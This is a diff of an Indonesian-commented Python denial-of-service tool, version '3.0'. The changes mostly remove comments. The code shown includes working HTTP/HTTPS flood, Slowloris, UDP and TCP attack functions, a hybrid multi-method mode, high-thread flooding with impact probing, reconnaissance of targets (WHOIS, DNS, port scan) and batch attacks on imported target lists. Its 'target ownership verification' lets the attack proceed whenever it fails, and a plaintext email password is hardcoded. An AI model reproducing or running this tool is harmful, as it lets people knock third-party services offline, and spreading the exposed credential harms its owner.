@@ -1,9 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-# ============================================
-# IMPORT LIBRARIES (dengan fallback untuk Termux)
-# ============================================
 import os
 import sys
 import socket
@@ -32,12 +29,10 @@ from email.mime.text import MIMEText
 #White: \033[97m
 #Black: \033[90m
 
-# Library opsional dengan graceful handling
 try:
     from colorama import init, Fore, Style
     init(autoreset=True)
 except ImportError:
-    # Fallback jika colorama tidak terinstal
     class Fore:
         RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; LIGHTBLUE_EX = ''
         def __init__(self): pass
@@ -81,9 +76,6 @@ try:
 except ImportError:
     rich_available = False
 
-# ============================================
-# KONFIGURASI AWAL
-# ============================================
 VERSION = "3.0 (Dengan 15 Fitur)"
 DEVELOPER = "Security Tool"
 WHITELIST = ['127.0.0.1']
@@ -93,12 +85,9 @@ RESULTS_FILE = "Results.txt"
 USER_DB = "users.json"
 AUDIT_LOG = "audit.json"
 SECRET_KEY_FILE = "secret.key"
-STOP_FLAG = False  # Untuk emergency stop
+STOP_FLAG = False
 CURRENT_USER = None
 
-# ============================================
-# KELAS STATISTIK (ditambah probe latency)
-# ============================================
 class AttackStats:
     def __init__(self):
         self.total_packets = 0
@@ -107,7 +96,7 @@ class AttackStats:
         self.packets_per_second = 0
         self.active_threads = 0
         self.target_status = "Unknown"
-        self.target_latency = -1  # untuk probe
+        self.target_latency = -1
         
     def start(self):
         self.start_time = time.time()
@@ -137,9 +126,6 @@ class AttackStats:
 
 stats = AttackStats()
 
-# ============================================
-# FUNGSI AUTENTIKASI (FITUR 1)
-# ============================================
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
 
@@ -150,7 +136,6 @@ def load_users():
                 return json.load(f)
         except:
             pass
-    # Default
     return {"A": hash_password("A")}
 
 def save_users(users):
@@ -176,9 +161,6 @@ def authenticate():
         print(Fore.RED + "[✗] Login gagal!")
         return False
 
-# ============================================
-# FUNGSI LOGGING & AUDIT (FITUR 5)
-# ============================================
 def log_activity(action, details):
     if not CURRENT_USER:
         user = "unknown"
@@ -194,16 +176,12 @@ def log_activity(action, details):
         with open(AUDIT_LOG, 'a') as f:
             json.dump(log_entry, f)
             f.write('\n')
-        # Setup logging dasar
         logging.basicConfig(filename='audit.log', level=logging.INFO,
                             format='%(asctime)s - %(levelname)s - %(message)s')
         logging.info(f"{user} - {action} - {details}")
     except:
         pass
 
-# ============================================
-# FUNGSI VALIDASI (ditambah IPv6)
-# ============================================
 def validate_input(prompt, min_val, max_val, input_type=int, default=None):
     while True:
         try:
@@ -253,9 +231,6 @@ def validate_target(ip, port):
         print(Fore.RED + f"[❌] Connection test failed: {e}")
         return False
 
-# ============================================
-# FITUR 3: INFORMASI TARGET LENGKAP (WHOIS, DNS)
-# ============================================
 def get_ip_location(ip):
     if not requests:
         return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}
@@ -301,9 +276,6 @@ def get_dns_records(domain):
             records[qtype] = []
     return records
 
-# ============================================
-# FITUR 2: HTTP/HTTPS FLOOD
-# ============================================
 def http_flood(ip, port, duration, packet_size, thread_id=1, ssl=False, method="GET", path="/"):
     protocol = "https" if ssl else "http"
     url = f"{protocol}://{ip}:{port}{path}"
@@ -319,14 +291,11 @@ def http_flood(ip, port, duration, packet_size, thread_id=1, ssl=False, method="
             else:
                 session.post(url, data={"key": "value"}, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=1)
             local_count += 1
-            stats.update(1, 500)  # perkiraan ukuran request
+            stats.update(1, 500)
         except:
             pass
     session.close()
 
-# ============================================
-# FITUR 11: SLOWLORIS ATTACK
-# ============================================
 def slowloris(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
     while time.time() < end_time and not STOP_FLAG:
@@ -338,20 +307,16 @@ def slowloris(ip, port, duration, packet_size, thread_id=1):
             sock.send(b"GET / HTTP/1.1\r\n")
             sock.send(b"Host: target\r\n")
             sock.send(b"User-Agent: Mozilla/5.0\r\n")
-            # Kirim header tambahan secara perlahan
             for _ in range(10):
                 if STOP_FLAG:
                     break
                 sock.send(b"X-Header: data\r\n")
                 time.sleep(10)
             sock.close()
-            stats.update(1, 200)  # perkiraan
+            stats.update(1, 200)
         except:
             pass
 
-# ============================================
-# FUNGSI SERANGAN LAMA (UDP, TCP) – dimodifikasi untuk IPv6
-# ============================================
 def udp_spam(ip, port, duration, packet_size, thread_id=1):
     family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
     sock = socket.socket(family, socket.SOCK_DGRAM)
@@ -442,9 +407,6 @@ def tcp_login(ip, port, duration, packet_size, thread_id=1):
         except:
             pass
 
-# ============================================
-# FITUR 7: MODE HIBRIDA
-# ============================================
 def hybrid_attack(ip, port, duration, packet_size, thread_count, methods):
     total_weight = sum(w for _, w in methods)
     threads = []
@@ -458,16 +420,12 @@ def hybrid_attack(ip, port, duration, packet_size, thread_count, methods):
     for t in threads:
         t.join(timeout=0.1)
 
-# ============================================
-# THREADED ATTACK (dimodifikasi dengan STOP_FLAG)
-# ============================================
 def threaded_attack(target_func, ip, port, duration, packet_size, thread_count=5):
     global STOP_FLAG
     STOP_FLAG = False
     threads = []
     stats.active_threads = thread_count
-    
-    # Mulai thread probe (fitur 9)
+
     probe_thread = threading.Thread(target=probe_target, args=(ip, port))
     probe_thread.daemon = True
     probe_thread.start()
@@ -484,19 +442,15 @@ def threaded_attack(target_func, ip, port, duration, packet_size, thread_count=5
         t.daemon = True
         threads.append(t)
         t.start()
-    
-    # Tunggu hingga durasi atau emergency stop
+
     start_time = time.time()
     while time.time() - start_time < duration and not STOP_FLAG:
         time.sleep(0.1)
     
     stats.active_threads = 0
-    STOP_FLAG = True  # memastikan semua thread berhenti
+    STOP_FLAG = True
     print(Fore.GREEN + f"[✅] All attack threads completed or stopped!")
 
-# ============================================
-# FITUR 9: PROBE TARGET (PENGUKURAN DAMPAK)
-# ============================================
 def probe_target(ip, port, interval=5):
     family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
     while stats.active_threads > 0 and not STOP_FLAG:
@@ -513,9 +467,6 @@ def probe_target(ip, port, interval=5):
             sock.close()
         time.sleep(interval)
 
-# ============================================
-# FITUR 14: DASHBOARD DENGAN GRAFIK (RICH)
-# ============================================
 def live_dashboard_rich():
     console = Console()
     with Live(console=console, refresh_per_second=1) as live:
@@ -568,7 +519,7 @@ def live_dashboard_simple():
 
 def start_monitor(interval=2):
     def monitor():
-        global STOP_FLAG                         # <-- pindahkan ke awal fungsi
+        global STOP_FLAG
         if rich_available:
             live_dashboard_rich()
         else:
@@ -586,9 +537,6 @@ def start_monitor(interval=2):
     monitor_thread.start()
     return monitor_thread
 
-# ============================================
-# FITUR 4: PELAPORAN PDF/HTML
-# ============================================
 def generate_pdf_report(attack_data, filename="report.pdf"):
     if not reportlab:
         print(Fore.YELLOW + "[!] reportlab tidak terinstal. Laporan PDF tidak dibuat.")
@@ -622,9 +570,6 @@ def generate_html_report(attack_data, filename="report.html"):
     except Exception as e:
         print(Fore.RED + f"[✗] Gagal membuat HTML: {e}")
 
-# ============================================
-# FITUR 6: VERIFIKASI KEPEMILIKAN TARGET
-# ============================================
 def verify_target_ownership(domain):
     if not whois:
         print(Fore.YELLOW + "[!] whois tidak terinstal. Verifikasi dilewati.")
@@ -635,10 +580,10 @@ def verify_target_ownership(domain):
         if not emails:
             print(Fore.YELLOW + "[!] Tidak ditemukan email kontak.")
             return True
-        # Kirim kode verifikasi ke email pertama
+
         code = str(random.randint(100000, 999999))
-        sender = "MyBion@proton.me"  # Ganti dengan email pengirim
-        password = "@adalah@pokonya$"       # Ganti dengan password
+        sender = "MyBion@proton.me"
+        password = "@adalah@pokonya$"
         msg = MIMEText(f"Kode verifikasi Anda: {code}")
         msg['Subject'] = "Verifikasi Target"
         msg['From'] = sender
@@ -659,13 +604,10 @@ def verify_target_ownership(domain):
                 return False
         except Exception as e:
             print(Fore.RED + f"[✗] Gagal mengirim email: {e}")
-            return True  # Izinkan jika gagal kirim
+            return True
     except:
         return True
 
-# ============================================
-# FITUR 8: NOTIFIKASI EMAIL
-# ============================================
 def send_notification(subject, body, to_email="your_email@gmail.com"):
     try:
         sender = "your_email@gmail.com"
@@ -682,9 +624,6 @@ def send_notification(subject, body, to_email="your_email@gmail.com"):
     except Exception as e:
         print(Fore.RED + f"[!] Gagal kirim notifikasi: {e}")
 
-# ============================================
-# FITUR 12: ENKRIPSI KONFIGURASI DAN HASIL
-# ============================================
 def load_key():
     if not os.path.exists(SECRET_KEY_FILE):
         if not Fernet:
@@ -720,7 +659,6 @@ def decrypt_file(enc_filename):
     decrypted = fernet.decrypt(encrypted)
     return decrypted.decode()
 
-# Modifikasi save_config dan load_config untuk enkripsi
 def save_config(config_data, encrypt=False):
     try:
         with open(CONFIG_FILE, 'w') as f:
@@ -751,9 +689,6 @@ def load_config(decrypt=False):
         print(Fore.RED + f"[❌] Failed to load config: {e}")
     return None
 
-# ============================================
-# FITUR 13: IMPORT TARGET DARI FILE
-# ============================================
 def import_targets(filename):
     targets = []
     try:
@@ -774,9 +709,6 @@ def import_targets(filename):
         print(Fore.RED + f"[✗] Gagal membaca file: {e}")
     return targets
 
-# ============================================
-# FUNGSI MENU DAN ANTARMUKA (dimodifikasi)
-# ============================================
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
@@ -862,7 +794,7 @@ def get_attack_parameters():
     port = validate_input("Target Port (1-65535, default 80): ", 1, 65535, default=80)
     duration = validate_input("Duration in seconds: ", 1, 99999, float, default=99999)
     packet_size = validate_input("Packet size in bytes (65500): ", 1, 65500, default=65500)
-    thread_count = validate_input("Thread count (default 100): ", 1, 1000, default=100)  # ditingkatkan
+    thread_count = validate_input("Thread count (default 100): ", 1, 1000, default=100)
     
     return {
         'ip': ip,
@@ -896,7 +828,6 @@ def run_attack(method_choice, params):
         print(Fore.CYAN + f"Threads: {params['thread_count']}")
         print(Fore.YELLOW + "="*60)
         
-        # Kirim notifikasi mulai (Fitur 8)
         send_notification("Attack Started", f"{method_name} on {params['ip']}:{params['port']}")
         
         if not validate_target(params['ip'], params['port']):
@@ -937,7 +868,6 @@ def run_attack(method_choice, params):
             print(Fore.CYAN + f"Duration: {final_stats['elapsed_time']:.2f} seconds")
             print(Fore.GREEN + "="*60)
             
-            # Kirim notifikasi selesai
             send_notification("Attack Finished", f"{method_name} completed. Packets: {final_stats['total_packets']}")
         
         return final_stats
@@ -945,9 +875,6 @@ def run_attack(method_choice, params):
         print(Fore.RED + "[❌] Invalid attack method!")
         return None
 
-# ============================================
-# SHOW TARGET INFO YANG DIPERLUAS (FITUR 3)
-# ============================================
 def show_target_info():
     print_banner()
     print(Fore.LIGHTBLUE_EX + "   🔹 TARGET INFORMATION 🔹   ")
@@ -960,15 +887,13 @@ def show_target_info():
     print()
     print(Fore.CYAN + "[🔍] Gathering information...")
     
-    # Lokasi IP
     location = get_ip_location(target)
     print(Fore.GREEN + f"Country: {location['country']}")
     print(Fore.GREEN + f"City: {location['city']}")
     print(Fore.GREEN + f"ISP: {location['isp']}")
     print(Fore.GREEN + f"Organization: {location['org']}")
     
-    # WHOIS jika domain
-    if not is_ipv6(target) and not target.replace('.','').isdigit():  # sederhana deteksi domain
+    if not is_ipv6(target) and not target.replace('.','').isdigit():
         whois_info = get_whois(target)
         if whois_info:
             print(Fore.GREEN + f"Registrar: {whois_info['registrar']}")
@@ -976,14 +901,12 @@ def show_target_info():
             print(Fore.GREEN + f"Expiration: {whois_info['expiration_date']}")
             print(Fore.GREEN + f"Name Servers: {', '.join(whois_info['name_servers'] if whois_info['name_servers'] else [])}")
     
-    # DNS records
     dns_records = get_dns_records(target)
     if dns_records:
         for qtype, records in dns_records.items():
             if records:
                 print(Fore.GREEN + f"{qtype} Records: {', '.join(records)}")
     
-    # Scan port umum
     print()
     print(Fore.CYAN + "[🔍] Scanning common ports...")
     common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080, 8443]
@@ -1007,9 +930,6 @@ def show_target_info():
     log_activity("TARGET_INFO", f"Informasi target {target}")
     input(Fore.CYAN + "\nPress Enter to continue...")
 
-# ============================================
-# SHOW SETTINGS (sama seperti asli)
-# ============================================
 def show_settings():
     global WHITELIST, BLACKLIST
     print_banner()
@@ -1037,9 +957,6 @@ def show_settings():
             print(Fore.GREEN + f"[✅] Removed {ip} from whitelist")
     input(Fore.CYAN + "\nPress Enter to continue...")
 
-# ============================================
-# FITUR 4: GENERATE REPORT (menu)
-# ============================================
 def generate_report_menu():
     print_banner()
     print(Fore.LIGHTBLUE_EX + "   🔹 GENERATE REPORT 🔹   ")
@@ -1052,11 +969,10 @@ def generate_report_menu():
     try:
         with open(RESULTS_FILE, 'r') as f:
             content = f.read()
-        # Ambil data terakhir
         import re
         last_attack = {}
         lines = content.strip().split('\n')
-        for line in lines[-20:]:  # ambil 20 baris terakhir
+        for line in lines[-20:]:
             if ':' in line:
                 parts = line.split(':', 1)
                 key = parts[0].strip()
@@ -1077,9 +993,6 @@ def generate_report_menu():
         print(Fore.RED + f"Error: {e}")
     input("Press Enter...")
 
-# ============================================
-# FITUR 13: IMPORT TARGET MENU
-# ============================================
 def import_targets_menu():
     print_banner()
     print(Fore.LIGHTBLUE_EX + "   🔹 IMPORT TARGETS FROM FILE 🔹   ")
@@ -1095,7 +1008,6 @@ def import_targets_menu():
         print(f"{i}. {ip}:{port}")
     choice = input("\nPilih nomor target untuk diserang, atau 0 untuk semua: ").strip()
     if choice == '0':
-        # Serang semua secara berurutan
         for ip, port in targets:
             print(Fore.YELLOW + f"\n--- Menyerang {ip}:{port} ---")
             params = {
@@ -1123,9 +1035,6 @@ def import_targets_menu():
             print(Fore.RED + "Pilihan tidak valid.")
     input("Press Enter...")
 
-# ============================================
-# FITUR 7: HYBRID ATTACK MENU
-# ============================================
 def hybrid_attack_menu():
     print_banner()
     print(Fore.LIGHTBLUE_EX + "   🔹 HYBRID ATTACK MODE 🔹   ")
@@ -1154,7 +1063,6 @@ def hybrid_attack_menu():
     if not methods:
         print(Fore.RED + "Tidak ada metode valid.")
         return
-    # Beri bobot sama
     methods = [(func, 1) for func, _ in methods]
     total_weight = len(methods)
     print(Fore.YELLOW + f"\nMemulai serangan hibrida dengan {total_weight} metode...")
@@ -1167,16 +1075,11 @@ def hybrid_attack_menu():
         print(Fore.YELLOW + "\nInterrupted")
     input("Press Enter...")
 
-# ============================================
-# MAIN FUNCTION
-# ============================================
 def main():
     global WHITELIST, BLACKLIST, STOP_FLAG
-    # Autentikasi dulu
     if not authenticate():
         sys.exit(1)
     
-    # Load konfigurasi awal
     loaded = load_config()
     if loaded:
         WHITELIST = loaded.get('whitelist', WHITELIST)
@@ -1268,9 +1171,6 @@ def main():
             print(Fore.RED + "Pilihan tidak valid.")
             time.sleep(1)
 
-# ============================================
-# SAVE RESULTS (sama seperti asli, ditambah enkripsi opsional)
-# ============================================
 def save_results(attack_data):
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
